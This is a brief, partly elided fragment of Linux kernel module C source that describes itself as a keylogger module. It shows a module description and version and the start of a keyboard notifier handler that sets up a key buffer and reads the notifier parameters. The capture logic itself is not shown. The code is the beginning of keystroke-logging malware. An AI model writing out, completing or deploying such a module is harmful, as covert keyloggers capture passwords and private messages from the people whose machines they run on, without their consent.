...
MODULE_DESCRIPTION("This is keylogger module");
MODULE_VERSION("0.01");
...
int keyboard_handler(struct notifier_block *nb ,  unsigned long code,  void *_param){
	char keyBuf[12] = {0};
	struct keyboard_notifier_param *param =  _param;
        //printk(KERN_INFO  "Handler called %d \n" , param->down);
